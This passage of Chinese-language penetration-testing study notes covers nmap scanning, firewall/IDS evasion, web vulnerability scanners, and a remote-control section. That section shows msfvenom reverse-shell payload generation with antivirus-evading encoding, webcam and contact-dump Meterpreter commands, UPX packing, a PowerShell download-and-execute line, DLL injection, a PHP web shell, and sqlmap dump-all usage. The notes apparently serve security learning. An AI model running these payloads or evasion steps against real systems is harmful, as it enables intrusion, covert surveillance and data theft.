&lt;name&gt;</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="三、Web"><a href="#三、Web" class="headerlink" title="三、Web"></a>三、Web</h2><h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1 信息收集"></a>1 信息收集</h3><blockquote><p><a href="https://stool.chinaz.com/same">IP分析</a></p></blockquote><h4 id="1-1-定义"><a href="#1-1-定义" class="headerlink" title="1.1 定义"></a>1.1 定义</h4><ul><li>被动扫描：在对方未知的情况下完成扫描。</li><li>主动扫描：主动发包，看响应。</li></ul><h4 id="1-2-maltego"><a href="#1-2-maltego" class="headerlink" title="1.2 maltego"></a>1.2 maltego</h4><blockquote><p>一键版信息收集（通过域名）<br>​下载后会自动加入在【01-信息收集 】中</p><p>注册登入：CE版（注册要科学上网）<br>normal：信息多，S：保密性强</p></blockquote><p>使用：</p><ul><li>“+” 号（上）—— Domain（左）——L1 - L3（1：更快，3：更全）</li></ul><h4 id="1-3-sn0int"><a href="#1-3-sn0int" class="headerlink" title="1.3 sn0int"></a>1.3 sn0int</h4><blockquote><p><a href="https://sn0int.readthedocs.io/en/stable/">official::sn0int</a></p><p><a href="https://github.com/kpcyrd/sn0int">模块开发与使用</a></p><p>工具集，可以自己开发模块（本身没有模块，需要自己添加）</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装（kali）：</span></span><br><span class="line">sudo apt install debian-keyring</span><br><span class="line">gpg -a --<span class="built_in">export</span> --keyring /usr/share/keyrings/debian-maintainers.gpg kpcyrd@archlinux.org | sudo <span class="built_in">tee</span> /etc/apt/trusted.gpg.d/apt-vulns-sexy.gpg</span><br><span class="line"><span class="built_in">echo</span> deb http://apt.vulns.sexy stable main | sudo <span class="built_in">tee</span> /etc/apt/sources.list.d/apt-vulns-sexy.list</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install sn0int</span><br><span class="line"><span class="comment"># 模块安装</span></span><br><span class="line">pkg quickstart</span><br><span class="line"><span class="comment"># 公钥问题</span></span><br><span class="line">gpg --keyserver subkeys.pgp.net --recv &lt;complete_key&gt;</span><br><span class="line">gpg --<span class="built_in">export</span> --armor &lt;last_eight_key&gt; | sudo apt-key add -</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用使用</span></span><br><span class="line"><span class="comment"># 创建工作区</span></span><br><span class="line">workspace &lt;name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 语句操作</span></span><br><span class="line"><span class="comment"># 添加域名</span></span><br><span class="line">add domain</span><br><span class="line"><span class="comment"># 查看域名（SQL语言具体查询，例：select domains where id=1 or value like %.com）</span></span><br><span class="line"><span class="keyword">select</span> domains</span><br><span class="line"><span class="comment"># 删除域名（子域名无效）</span></span><br><span class="line">noscope/delete domains <span class="built_in">where</span> value=url</span><br><span class="line"><span class="comment"># 删除子域名</span></span><br><span class="line">noscope/delete subdomains <span class="built_in">where</span> value=url</span><br><span class="line">target <span class="comment"># 当前模块目标</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 模块使用</span></span><br><span class="line"><span class="comment"># 查询（所有域名的）子域名（并加到 subdomain 中）</span></span><br><span class="line">use ctlogs —— run</span><br><span class="line"><span class="comment"># 解析可以解析的子域名并更新</span></span><br><span class="line">use dns-resolve —— run</span><br><span class="line"><span class="comment"># 查询可以访问的端口并更新</span></span><br><span class="line">use url-scan —— run</span><br></pre></td></tr></table></figure><h4 id="1-4-NMAP"><a href="#1-4-NMAP" class="headerlink" title="1.4 NMAP"></a>1.4 NMAP</h4><blockquote><p><a href="https://www.sogou.com/sie?query=nmap+-PY">author::【工具】nmap使用手册（文末送书）</a></p></blockquote><h5 id="1-4-1-主机发现"><a href="#1-4-1-主机发现" class="headerlink" title="1.4.1 主机发现"></a>1.4.1 主机发现</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.全面扫描/综合扫描</span></span><br><span class="line">nmap -A 192.168.242.1 </span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.Ping扫描</span></span><br><span class="line">nmap -sP 192.168.242.1/24</span><br><span class="line">nmap -sn 192.168.242.1/24 <span class="comment"># 同一网段是arp，不同网段用其他协议</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.免ping扫描，穿透防火墙，避免被防火墙发现</span></span><br><span class="line">nmap -P0 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.TCP SYN  Ping扫描</span></span><br><span class="line">nmap -PS -v 192.168.242.135</span><br><span class="line">nmap -PS80(端口)，10-100  -v 192.168.242.135  <span class="comment"># 针对防火墙丢弃RST包</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.TCP ACK Ping 扫描</span></span><br><span class="line">nmap -PA -v 192.168.242.135</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6.UDP Ping 扫描</span></span><br><span class="line">nmap -PU -v 192.168.242.135</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7.ICMP Ping Types 扫描（应答在线，不应答不一定不在线（防火墙））</span></span><br><span class="line">nmap -PE -v 192.168.242.135 <span class="comment"># ICMP ECHO</span></span><br><span class="line">nmap -PP -v 192.168.242.135 <span class="comment"># ICMP 时间戳</span></span><br><span class="line">nmap -PM -v 192.168.242.135 <span class="comment"># ICMP 地址掩码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 8.ARP Ping 扫描</span></span><br><span class="line">nmap -PR -v 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 9.列表扫描</span></span><br><span class="line">nmap -sL -v 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10.禁止方向域名解析</span></span><br><span class="line">nmap -n -sL -v 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 11.方向域名解析</span></span><br><span class="line">nmap -R -sL -v 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 12.使用系统域名解析系统</span></span><br><span class="line">nmap --system-dns 192.168.242.1 192.168.242.135</span><br><span class="line"></span><br><span class="line"><span class="comment"># 13.扫描IPV6 地址</span></span><br><span class="line">nmap -6 IPv6</span><br><span class="line"></span><br><span class="line"><span class="comment"># 14.路由跟踪</span></span><br><span class="line">nmap --traceroute -v www.sunbridgegroup.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 15.SCTP INIT Ping 扫描</span></span><br><span class="line">nmap -PY -v 192.168.1.103</span><br></pre></td></tr></table></figure><h5 id="1-4-2-端口扫描"><a href="#1-4-2-端口扫描" class="headerlink" title="1.4.2 端口扫描"></a>1.4.2 端口扫描</h5><blockquote><p><a href="https://www.cnblogs.com/Rain99-/p/12882677.html">端口详细状态</a></p></blockquote><div class="table-container"><table><thead><tr><th>端口状态</th><th>作用</th></tr></thead><tbody><tr><td>open</td><td>开放</td></tr><tr><td>closed</td><td>关闭</td></tr><tr><td>filtered</td><td>阻塞的，未到达。不确定开放（可能是自己主机开了防火墙）</td></tr><tr><td>unfiltered</td><td>可访问但未知开放</td></tr><tr><td>open &#124; filtered</td><td>nmap无法确认端口状态</td></tr><tr><td>closed &#124; filtered</td><td>nmap无法确认端口状态</td></tr></tbody></table></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.时序扫描（0：偏执的，慢，常用于逃避IDS；1：鬼祟的，同0；2:文雅的，不常用；3：默认的；4：野蛮的，常用的；5：疯狂的，会降低精度）</span></span><br><span class="line">nmap -T(0-5) 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.常用扫描方式</span></span><br><span class="line">nmap -p 80 192.168.242.1</span><br><span class="line">nmap -p 80-100 192.168.242.1</span><br><span class="line">nmap -p T:80,U:445 192.168.242.135</span><br><span class="line">nmap -F 192.168.242.135 (快速扫描)</span><br><span class="line">nmap --top-ports 200 192.168.242.1 (扫描最有用的前200 个端口)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.TCP SYN 扫描（高效的扫描方式）</span></span><br><span class="line">nmap -sS -v 192.168.242.135</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.TCP 连接扫描</span></span><br><span class="line">nmap -sT -v 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.UDP 连接扫描</span></span><br><span class="line">nmap -sU -p 80-100 192.168.242.135</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6.隐蔽扫描</span></span><br><span class="line">nmap -sN 61.241.194.153(NULL 扫描)</span><br><span class="line">nmap -sF 61.241.194.153(FIN 扫描)</span><br><span class="line">nmap -sX 61.241.194.153(Xmas 扫描)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7.TCP ACK 扫描</span></span><br><span class="line">nmap -sA 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 8.TCP 窗口扫描</span></span><br><span class="line">nmap -sW -v -F 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 9.TCP Maimon 扫描</span></span><br><span class="line">nmap -sM -T4 192.168.242.135</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10.自定义扫描</span></span><br><span class="line">nmap -sT --scanflags SYNURG 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 11.空闲扫描( 隐藏IP )</span></span><br><span class="line">nmap -sI www.0day.co:80 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 12.IP 协议扫描</span></span><br><span class="line">nmap -sO -T4 192.168.242.1</span><br></pre></td></tr></table></figure><h5 id="1-4-3-指纹识别与探测"><a href="#1-4-3-指纹识别与探测" class="headerlink" title="1.4.3 指纹识别与探测"></a>1.4.3 指纹识别与探测</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.版本探测</span></span><br><span class="line">nmap -sV 192.168.242.135</span><br><span class="line">nmap -sV -A 192.168.241.135</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.全端口版本探测</span></span><br><span class="line">nmap -sV --allports 192.168.242.135</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.设置扫描强度</span></span><br><span class="line">nmap -sV --version-intensity (0-9) 192.168.242.135</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.轻量级扫描</span></span><br><span class="line">nmap -sV --version-light 2 192.168.242.135</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.重量级扫描</span></span><br><span class="line">nmap -sV --version-all 192.168.242.135</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6.获取详细版本信息</span></span><br><span class="line">nmap -sV --version-trace 192.168.242.135</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7.RPC 扫描</span></span><br><span class="line">nmap -sS -sR 192.168.242.135</span><br><span class="line"></span><br><span class="line"><span class="comment"># 8.对指定的目标进行操作系统监测</span></span><br><span class="line">nmap -O --osscan-limit 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 9.推测系统并识别</span></span><br><span class="line">nmap -O --osscan-guess 192.168.242.1</span><br></pre></td></tr></table></figure><h5 id="1-4-4-伺机而动"><a href="#1-4-4-伺机而动" class="headerlink" title="1.4.4 伺机而动"></a>1.4.4 伺机而动</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.调整并行扫描组的大小</span></span><br><span class="line">nmap --min-hostgroup 30 192.168.242.1/24</span><br><span class="line">nmap --max-hostgroup 30 902 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.调整探测报文的并行度</span></span><br><span class="line">nmap --min-parallelism 100 192.168.242.1</span><br><span class="line">nmap --max-parallelism 100 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.调整探测报文超时</span></span><br><span class="line">nmap --initial-rtt-timeout 100ms 192.168.242.1</span><br><span class="line">nmap --max-rtt-timeout 100ms 192.168.242.1</span><br><span class="line">nmap --min-rtt-timeout 100ms 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.放弃缓慢的目标主机</span></span><br><span class="line">nmap --host-timeout 1800000ms 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.调整报文适合时间间隔</span></span><br><span class="line">nmap --scan-delay 1s 192.168.242.1</span><br><span class="line">nmap --max-scan-delay 1s 192.168.242.1</span><br></pre></td></tr></table></figure><h5 id="1-4-5-防火墙-IDS-逃逸"><a href="#1-4-5-防火墙-IDS-逃逸" class="headerlink" title="1.4.5 防火墙/IDS 逃逸"></a>1.4.5 防火墙/IDS 逃逸</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.报文分段</span></span><br><span class="line">nmap -f -v 61.241.194.153</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.指定偏移大小</span></span><br><span class="line">nmap --mtu 16 192.168.242.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.IP 欺骗</span></span><br><span class="line">nmap -D RND:11 192.168.1.104</span><br><span class="line">nmap -D 192.168.1.104,192.168.1.103,192.168.1.101 192.168.1.104</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.源地址欺骗</span></span><br><span class="line">nmap -sI [www.0day.cn:80](http://www.0day.cn/) 192.168.1.104</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.源端口欺骗</span></span><br><span class="line">nmap --source-port 902 192.168.1.104</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6.指定发包长度</span></span><br><span class="line">nmap --data-length 30 192.168.1.104</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7.目标主机随机排序</span></span><br><span class="line">nmap --randomize-hosts 192.168.1.104</span><br><span class="line"></span><br><span class="line"><span class="comment"># 8.MAX 地址欺骗</span></span><br><span class="line">nmap -sT -Pn --spoof-mac 0 192.168.1.104</span><br></pre></td></tr></table></figure><h5 id="1-4-6-信息搜集"><a href="#1-4-6-信息搜集" class="headerlink" title="1.4.6 信息搜集"></a>1.4.6 信息搜集</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.IP 信息收集</span></span><br><span class="line">nmap --script ip-geolocation-* www.pcos.cn</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.WHOIS 查询</span></span><br><span class="line">nmap --script whois-domain www.pcos.cn</span><br><span class="line">nmap --script whois-domain --script-args whois.whodb=nofollow www.ithome.com</span><br><span class="line">nmap -sn --script whois-domain -v -iL host.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.IP 反查</span></span><br><span class="line">nmap -sn --script hostmap-ip2hosts www.pcos.cn</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.DNS 信息收集</span></span><br><span class="line">nmap --script dns-brute www.pcos.cn</span><br><span class="line">nmap --script dns-brute dns-brute.threads=10 www.pcos.cn</span><br><span class="line">nmap --script dns-brute dns-brute.threads=10,dns-brute.hostlis www.pcos.cn</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.检索系统信息</span></span><br><span class="line">nmap -p 445 445 192.168.1.104 --script membase-http-info</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6.后台打印机服务漏洞</span></span><br><span class="line">nmap --script smb-security-mode.nse -p 445 119.29.155.45</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7.系统漏洞扫描</span></span><br><span class="line">nmap --script smb-check-vulns.nse -p 445 119.29.155.45</span><br><span class="line"></span><br><span class="line"><span class="comment"># 9.扫描Web 漏洞</span></span><br><span class="line">nmap -p80 --script http-stored-xss.nse/http-sql-injection.nse 119.29.155.45</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10.通过Snmp 列举Windows 服务/账户</span></span><br><span class="line">nmap -sU -p 161 --script=snmp-win32-services 192.168.1.104</span><br><span class="line">nmap -sU -f -p 161 --script=snmp-win32-users 192.168.1.110</span><br><span class="line"></span><br><span class="line"><span class="comment"># 11.枚举DNS 服务器的主机名</span></span><br><span class="line">nmap --script dns-brute --script-args dns-brute.domain=baidu.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 12.HTTP 信息收集</span></span><br><span class="line">nmap -sV -p 80 www.0day.com(HTTP 版本探测)</span><br><span class="line">nmap -p 80 --script=http-headers www.pcos.cn (HTTP 信息头探测)</span><br><span class="line">nmap -p 80 --script=http-sitemap-generator www.pcos.cn (爬行Web 目录结构)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 13.枚举SSL 密钥</span></span><br><span class="line">nmap -p 443 --script=ssl-enum-ciphers www.baidu.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 14.SSH 服务密钥信息探测</span></span><br><span class="line">nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full 127.0.0.1</span><br></pre></td></tr></table></figure><h5 id="1-4-7-结果输出"><a href="#1-4-7-结果输出" class="headerlink" title="1.4.7 结果输出"></a>1.4.7 结果输出</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1、输出xml</span></span><br><span class="line">nmap <span class="number">192.168</span><span class="number">.223</span><span class="number">.129</span> -oX Report.xml</span><br></pre></td></tr></table></figure><h3 id="2-Web扫描"><a href="#2-Web扫描" class="headerlink" title="2 Web扫描"></a>2 Web扫描</h3><h4 id="2-1-域名扫描"><a href="#2-1-域名扫描" class="headerlink" title="2.1 域名扫描"></a>2.1 域名扫描</h4><ul><li><p>dirb</p><blockquote><p>原理：靠字典扫描</p><p><code>dirb url</code>：扫描url</p></blockquote></li><li><p>dirsearch</p></li></ul><h4 id="2-2-Web信息扫描"><a href="#2-2-Web信息扫描" class="headerlink" title="2.2 Web信息扫描"></a>2.2 Web信息扫描</h4><ul><li><p>whatweb</p><blockquote><p>收集web相关信息</p><p><code>whatweb url</code>：输出信息</p><p>-v：格式化输出</p></blockquote></li></ul><h3 id="3-漏洞扫描"><a href="#3-漏洞扫描" class="headerlink" title="3 漏洞扫描"></a>3 漏洞扫描</h3><h4 id="3-1-NMAP（主机漏洞）"><a href="#3-1-NMAP（主机漏洞）" class="headerlink" title="3.1 NMAP（主机漏洞）"></a>3.1 NMAP（主机漏洞）</h4><ul><li><p>脚本使用</p><ol><li><p>指定脚本</p><p><code>sudo nmap --script ftp-vsftpd-backdoor 192.168.17.137</code></p></li><li><p>全面扫描</p><p><code>sudo nmap --script vuln 192.168.17.137</code></p></li><li><p>更全面扫描</p><p><code>cd .../scripts —— sudo git clone https://github.com/scipag/vulscan.git</code>（安装库到 scripts 中）</p><p><code>sudo nmap --script vulscan --script-args vulscandb=scipvuldb.csv -sV 192.168.17.137 [ |more ]</code>（更多显示，| 和 more 中间无空格）</p></li></ol></li></ul><h4 id="3-2-zaproxy（Web漏洞）"><a href="#3-2-zaproxy（Web漏洞）" class="headerlink" title="3.2 zaproxy（Web漏洞）"></a>3.2 zaproxy（Web漏洞）</h4><p><code>sudo apt install zaproxy</code>   </p><p>手动扫描：firefox（上右）——找到网址——攻击（站点）——主动扫描——警报（查看结果）</p><h4 id="3-3-rips-0-55（PHP代码审计）"><a href="#3-3-rips-0-55（PHP代码审计）" class="headerlink" title="3.3 rips-0.55（PHP代码审计）"></a>3.3 rips-0.55（PHP代码审计）</h4><blockquote><p><a href="https://rips-scanner.sourceforge.net/">official::RIPS</a> </p><p><a href="https://www.cnblogs.com/staffyoung/p/7169165.html">rips使用</a></p><p>该工具主要用于学习，实战需要更好的审计工具。</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">mv</span> -v rips-0.55 /var/www/html</span><br><span class="line">sudo service apache2 start <span class="comment"># 首次移动重新打开服务</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 403Error：chmod 755 -R rips-0.55</span></span><br><span class="line"><span class="comment"># 注：只可以进行本机扫描</span></span><br></pre></td></tr></table></figure><h3 id="4-远程控制"><a href="#4-远程控制" class="headerlink" title="4 远程控制"></a>4 远程控制</h3><h4 id="4-1-木马分类"><a href="#4-1-木马分类" class="headerlink" title="4.1 木马分类"></a>4.1 木马分类</h4><ul><li>正向木马：被控端感染木马后，主控端需要主动扫描才可以得知并连接。（不易暴露，但不知道木马什么时候被感染）</li><li>反向木马：在木马中留下 IP 地址，当被控端感染木马后会主动连接主控端。</li></ul><h4 id="4-2-netcat（瑞士军刀）"><a href="#4-2-netcat（瑞士军刀）" class="headerlink" title="4.2 netcat（瑞士军刀）"></a>4.2 netcat（瑞士军刀）</h4><blockquote><p><a href="https://www.sqlsec.com/2019/10/nc.html">nc命令教程</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -v ip port：探测端口是否开放（出现结果后可以直接中断）</span><br><span class="line">nc ip port：远程控制</span><br></pre></td></tr></table></figure><h4 id="4-3-MSFPC（生成远控软件）"><a href="#4-3-MSFPC（生成远控软件）" class="headerlink" title="4.3 MSFPC（生成远控软件）"></a>4.3 MSFPC（生成远控软件）</h4><p>MSFPC：msf payload creator</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 选择在哪个ip上生成指定platform的木马（ip 一般指定 eth0）（protocol：选择传输的协议，默认 tcp，改成 https 更安全）</span></span><br><span class="line">msfpc &lt;platform&gt; &lt;protocol&gt; &lt;ip&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行控制文件（rc：主控端文件，其他为被控端文件）</span></span><br><span class="line">msfconsole - q -r file.rc</span><br></pre></td></tr></table></figure><h4 id="4-4-msfvenom（生成远控软件，更全面）"><a href="#4-4-msfvenom（生成远控软件，更全面）" class="headerlink" title="4.4 msfvenom（生成远控软件，更全面）"></a>4.4 msfvenom（生成远控软件，更全面）</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-p / --payload &lt;payload&gt; <span class="comment"># 指定攻击载荷（msfvenom -l payloads：查询）</span></span><br><span class="line">-f / --format &lt;format&gt; <span class="comment"># 指定输出格式（msfvenom --list formats）（c：十六进制）</span></span><br><span class="line">-o / --out &lt;path&gt; <span class="comment"># 指定输出路径</span></span><br><span class="line">-e &lt;encode&gt; <span class="comment"># 指定加密码（一般的是固定加结果，x86/shikata_ga_nai：随机加密，防查杀可以选择多次/多重编码）</span></span><br><span class="line">-i &lt;num&gt; <span class="comment"># 指定编码次数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 某个payload的详细用法</span></span><br><span class="line">msfvenom --list-options -p &lt;payloads&gt;</span><br><span class="line"><span class="comment"># 查询所有加密码</span></span><br><span class="line">msfvenom -l encoders</span><br><span class="line"></span><br><span class="line"><span class="comment"># 普通被控端</span></span><br><span class="line">sudo msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.157.156 lport=5000 -f exe -o /var/payload.exe</span><br><span class="line"><span class="comment"># 多重多次编码的被控端</span></span><br><span class="line">sudo msfvenom  -p windows/meterpreter/reverse_tcp lhost=192.168.157.156 lport=5000 -e x86/shikata_ga_nai -i 10 -f raw | msfvenom -e x86/alpha_super -i 5 -f exe -o /var/payload.exe</span><br><span class="line"><span class="comment"># 安卓被控端</span></span><br><span class="line">sudo msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.1.104 lport=9999 R&gt;/var/pentestAndroid9999.apk</span><br><span class="line"></span><br><span class="line"><span class="comment"># msfvenom主控端操作（meterpreter）</span></span><br><span class="line"><span class="comment"># 主控端启动</span></span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload </span><br><span class="line"><span class="built_in">set</span> lhost </span><br><span class="line"><span class="built_in">set</span> lport </span><br><span class="line">exploit </span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得帮助</span></span><br><span class="line"><span class="built_in">help</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 摄像头命令</span></span><br><span class="line">Webcam Commands <span class="comment"># 摄像头命令</span></span><br><span class="line">web_cam_list <span class="comment"># 摄像头列表</span></span><br><span class="line">webcam_snap &lt;num&gt; <span class="comment"># 开启摄像头</span></span><br><span class="line">webcam_stream &lt;num&gt; <span class="comment"># 录视频</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 权限命令</span></span><br><span class="line">check_root <span class="comment"># 检测是否 root</span></span><br><span class="line">dump_contacts <span class="comment"># 导出记录</span></span><br><span class="line">geolocate <span class="comment"># 获取定位</span></span><br></pre></td></tr></table></figure><h4 id="4-5-杀毒软件（upx加壳）"><a href="#4-5-杀毒软件（upx加壳）" class="headerlink" title="4.5 杀毒软件（upx加壳）"></a>4.5 杀毒软件（upx加壳）</h4><blockquote><p> <a href="https://www.virscan.org/">病毒在线检测</a></p></blockquote><ul><li>杀毒软件原理：<ol><li>基于文件扫描的反病毒技术：检测二进制代码（检测硬盘），如果是病毒将加入特征库便于下次检测。</li><li>基于内存的反病毒技术：运行时发现，执行后的结构会与病毒特征匹配，匹配成功将不会被执行。</li><li>基于行为的反病毒技术：如果软件运行时执行的操作可疑（改注册表、控制进程等）将会被当成病毒查杀。</li></ol></li><li>反杀毒方式：<ol><li>改特征码。</li><li>添加花指令：添加无意义的指令改变特征码的位置。</li><li>程序加密：加壳，变成 PE 文件中的一串数据。（整个过程在加密过程中进行）</li></ol></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 为软件加壳</span></span><br><span class="line">sudo upx &lt;path&gt;</span><br></pre></td></tr></table></figure><h4 id="4-6-powerspolit"><a href="#4-6-powerspolit" class="headerlink" title="4.6 powerspolit"></a>4.6 powerspolit</h4><blockquote><p>原理：被控端被控之后访问主控端的网站，利用被控端的 powershell 对被控端执行操作。<br>该程序主要用于搭建一个网站让被控端访问后控制被控端的 powershell，逃过杀毒软件的基于行为检测。</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 搭建网站</span></span><br><span class="line">powerspolit —— python3 -m http.server &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载脚本</span></span><br><span class="line">iex(New-Object Net.webclient).DownloadString(<span class="string">&quot;url&quot;</span>)</span><br><span class="line"><span class="comment"># 脚本帮助</span></span><br><span class="line">get-help &lt;name&gt;</span><br><span class="line"><span class="comment"># 常用脚本</span></span><br><span class="line"><span class="comment"># 分包</span></span><br><span class="line">AntivirusBypass——Find_AVSignature.ps1</span><br><span class="line"><span class="comment"># 将 dll 文件注入到进程中</span></span><br><span class="line">CodeExectuion——Invoke-Dlllnjection.ps1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用</span></span><br><span class="line"><span class="comment"># 重新分包，分特征码，防止被发现</span></span><br><span class="line">find-avsignature -StartByte &lt;num&gt; -EndByte &lt;num&gt; -Interval &lt;num&gt; -path &lt;path&gt; -outpath &lt;path&gt;</span><br><span class="line">Invoke-Dlllnjection.ps1 -ProcessID &lt;ID&gt; -DLL &lt;path&gt;</span><br></pre></td></tr></table></figure><h4 id="4-7-weevely（PHP恶意代码生成）"><a href="#4-7-weevely（PHP恶意代码生成）" class="headerlink" title="4.7 weevely（PHP恶意代码生成）"></a>4.7 weevely（PHP恶意代码生成）</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 本地生成木马（带有密码，让他人无法访问）</span></span><br><span class="line">weevely generate &lt;password&gt; &lt;path&gt;</span><br><span class="line"><span class="comment"># 远程控制</span></span><br><span class="line">weeveky &lt;url&gt; &lt;password&gt;</span><br><span class="line"><span class="comment"># 帮助</span></span><br><span class="line"><span class="built_in">help</span></span><br></pre></td></tr></table></figure><h3 id="5-渗透测试"><a href="#5-渗透测试" class="headerlink" title="5 渗透测试"></a>5 渗透测试</h3><h4 id="5-1-sqlmap"><a href="#5-1-sqlmap" class="headerlink" title="5.1 sqlmap"></a>5.1 sqlmap</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 参数</span></span><br><span class="line">-u/--url &lt;url&gt; <span class="comment"># 指定注入目标 url</span></span><br><span class="line">--dbms &lt;sql&gt; <span class="comment"># 指定数据库（ --dbms=mysql ）</span></span><br><span class="line">--os &lt;os&gt; <span class="comment"># 指定操作系统（ --os=Windows ）</span></span><br><span class="line">--flush-session <span class="comment"># 刷新缓存</span></span><br><span class="line">--proxy <span class="comment"># 指定代理（ --proxy http://ip:port ）</span></span><br><span class="line">--user-agent <span class="comment"># 指定 user-agent 信息（ --user-agent=&#x27;...&#x27; ）</span></span><br><span class="line">-data <span class="comment"># 数据以 POST 方式提交（ --data=&quot;id=1&quot;）</span></span><br><span class="line">--form <span class="comment"># 自行寻找参数构造表单</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤</span></span><br><span class="line"><span class="comment"># 所有数据库</span></span><br><span class="line">sqlmap -u  &lt;url&gt; --dbs --form</span><br><span class="line"><span class="comment"># 当前数据库</span></span><br><span class="line">sqlmap -u &lt;url&gt; --current-db --form</span><br><span class="line"><span class="comment"># 表</span></span><br><span class="line">sqlmap -u &lt;url&gt; -D <span class="string">&#x27;DBname&#x27;</span> --tables --form</span><br><span class="line"><span class="comment"># 列</span></span><br><span class="line">sqlmap -u &lt;url&gt; -D <span class="string">&#x27;DBname&#x27;</span> -T <span class="string">&#x27;table&#x27;</span> --columns --form</span><br><span class="line"><span class="comment"># 数据</span></span><br><span class="line">sqlmap -u &lt;url&gt; -D <span class="string">&#x27;DBname&#x27;</span> -T <span class="string">&#x27;table&#x27;</span> -C <span class="string">&#x27;column_1 , column_2&#x27;</span> --dump --form</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一次性爆破所有数据</span></span><br><span class="line">sqlmap -u &lt;目标URL&gt; --batch --crawl=1 --level=5 --risk=3 --dump-all</span><br><span class="line">--batch <span class="comment"># 不要求用户输入，直接默认</span></span><br></pre></td></tr></table></figure><h4 id="5-2-metasploit"><a href="#5-2-metasploit" class="headerlink" title="5.2 metasploit"></a>5.2 metasploit</h4><blockquote><p>如下。</p></blockquote><h3 id="6-metasploit"><a 